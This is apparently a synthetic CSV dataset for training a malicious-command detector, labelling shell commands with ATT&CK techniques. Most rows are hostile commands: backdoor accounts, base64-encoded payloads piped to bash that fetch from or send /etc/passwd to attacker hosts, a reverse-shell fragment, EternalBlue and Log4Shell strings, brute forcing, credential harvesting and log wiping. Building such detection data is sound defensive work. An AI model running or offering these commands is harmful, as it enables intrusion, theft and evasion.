command,features,label,source
nohup fping -a -g 192.168.1.0/24 2>/dev/null &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
net user /add attacker P@ssw0rd | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' | sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arecord -d 60 -f cd /tmp/audio.wav | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash hacker && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 decrypt_chrome_cookies.py --profile ~/.config/google-chrome/Default,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
"time php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
find /tmp -name 'cmd_*' -exec bash {} \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
nohup cat /etc/openvpn/*.conf &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1005_Data_from_Local_System'],synthetic
echo 'cHl0aG9uMyAtYyAiZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYjsgSW1hZ2VHcmFiLmdyYWIoKS5zYXZlKCcvdG1wL3MucG5nJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'd21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlICdjbWQuZXhlIC9jIHdob2FtaSc=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1027_Obfuscated_Files_or_Information']",synthetic
uname -a | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
id -Gn | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bHNiX3JlbGVhc2UgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
bitsadmin /transfer myJob http://attacker.com/payload.exe %TEMP%\payload.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1197_BITS_Jobs'],synthetic
sudo cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1176_Browser_Extensions'],synthetic
time find / -name '*.pem' -exec cp {} /tmp/loot \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1074_Data_Staged'],synthetic
time find / -name 'id_rsa' 2>/dev/null | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'cHRyYWNlIGluamVjdCAkKHBncmVwIGJhc2gpIC90bXAvc2hlbGxjb2Rl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1055_Process_Injection', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
python3 eternalblue.py 10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sqlmap  -u  'http://target.com/login?id=1'  --dbs  --batch,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";...","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3  decrypt_chrome_cookies.py  --profile  ~/.config/google-chrome/Default,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
find / -name '*.docx' -newer /tmp/.ref 2>/dev/null | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1005_Data_from_Local_System', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
"bash -c ""ip neigh show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"python3 -c ""import subprocess; [subprocess.run(l.strip(),shell=True) for l in open('/tmp/cmds')]""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
reg query HKLM\SYSTEM\CurrentControlSet\Services,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1012_Query_Registry'],synthetic
"nohup nmap -sV -p 22,80,443 10.0.0.0/24 ; echo done &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ffmpeg -f alsa -i default -t 60 /tmp/mic.mp3,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
gnome-screenshot -f /tmp/grab.png | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""nmap -sn 192.168.1.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.68, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo 'c3NoIC1MIDgwODA6aW50ZXJuYWw6ODAgdXNlckBqdW1wLmhvc3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'c2VjcmV0c2R1bXAucHkgLWp1c3QtZGMtdXNlciBBZG1pbmlzdHJhdG9yIGRvbWFpbi91c2VyOnBhc3NAREM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
time reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1012_Query_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
xargs -a /tmp/cmds.txt sh -c ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1202_Indirect_Command_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
find  /  -name  '*.docx'  -exec  cp  {}  /tmp/collected/  \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1119_Automated_Collection'],synthetic
scrot -u /tmp/cap.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'Y2hpc2VsIGNsaWVudCAxMC4wLjAuOTk6ODAwMCBSOjgwOjEyNy4wLjAuMTo4MCA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1090_Proxy', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
reg query HKLM\SYSTEM\CurrentControlSet\Services,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1012_Query_Registry'],synthetic
time cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NDsgcHJpbnQoYmFzZTY0LmI2NGVuY29kZShvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3JiJykucmVhZCgpKS5kZWNvZGUoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1132_Data_Encoding', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IC9ldGMvcGFtLmQvY29tbW9uLXBhc3N3b3Jk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1201_Password_Policy_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQgJiYgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup cat /proc/cpuinfo | grep hypervisor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
nohup Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1012_Query_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup find / -name '*.pem' 2>/dev/null ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 exploit.py --target localhost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'c29jYXQgVENQLUxJU1RFTjo4MDgwLGZvcmsgVENQOmludGVybmFsLnRhcmdldDo4MA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1090_Proxy', 'T1027_Obfuscated_Files_or_Information']",synthetic
chage -l root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
time systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'aGVsbG8gd29ybGQ=' | base64 -d,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
salt '*' cmd.run 'curl http://evil.com | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'bXNmY29uc29sZSAtcSAteCAndXNlIGV4cGxvaXQvd2luZG93cy9zbWIvbXMxN18wMTBfZXRlcm5hbGJsdWU7IHNldCBSSE9TVFMgMTAuMC4wLjU7IHJ1bic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/pam.d/common-password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nohup sqlmap -u 'http://target.com/login?id=1' --dbs --batch &,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat  /tmp/encoded  |  xxd  -r  -p  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCA7ID4gL2Rldi9udWxsIDI+JjE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLyA7IGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
time echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHN1YnByb2Nlc3M7IFtzdWJwcm9jZXNzLnJ1bihsLnN0cmlwKCksc2hlbGw9VHJ1ZSkgZm9yIGwgaW4gb3BlbignL3RtcC9jbWRzJyldIg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1202_Indirect_Command_Execution', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
"bash -c ""rsync -av /etc/ /tmp/etc_backup/ ; chmod +x /tmp/payload""","[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter']",synthetic
rsync -av /etc/ /tmp/etc_backup/ | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo find /home -name '*.kdbx' 2>/dev/null,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1005_Data_from_Local_System'],synthetic
"bash -c ""echo 'bG4gLXMgL2Jpbi9iYXNoIC90bXAva3dvcmtlcg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1036_Masquerading', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
time cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1176_Browser_Extensions'],synthetic
sqlmap -u 'http://target.com/login?id=1' --dbs --batch ; history -c,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1047_Windows_Management_Instrumentation'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1012_Query_Registry'],synthetic
"time ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1087_Account_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host ; echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c3NoIC1MIDgwODA6aW50ZXJuYWw6ODAgdXNlckBqdW1wLmhvc3QgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
LD_PRELOAD=/tmp/evil.so /usr/bin/sudo whoami ; sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1055_Process_Injection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
